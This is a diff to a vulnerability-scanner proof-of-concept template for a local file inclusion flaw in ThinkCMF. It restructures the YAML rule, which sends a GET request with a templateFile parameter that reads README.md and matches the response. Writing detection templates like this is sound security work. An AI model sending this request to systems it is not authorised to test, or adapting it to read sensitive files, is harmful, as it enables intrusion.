@@ -1,13 +1,16 @@
 name: poc-yaml-thinkcmf-lfi
-
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: "/?a=display&templateFile=README.md"
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF"))) && response.body.bcontains(bytes(string(b"## README")))
-
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /?a=display&templateFile=README.md
+        expression: response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF"))) && response.body.bcontains(bytes(string(b"## README")))
+expression: r0()
 detail:
-  author: JerryKing
-  ThinkCMF: x1.6.0/x2.1.0/x2.2.0-2
-  links:
-    - https://www.freebuf.com/vuls/217586.html
+    author: JerryKing
+    links:
+        - https://www.freebuf.com/vuls/217586.html
+    ThinkCMF: x1.6.0/x2.1.0/x2.2.0-2
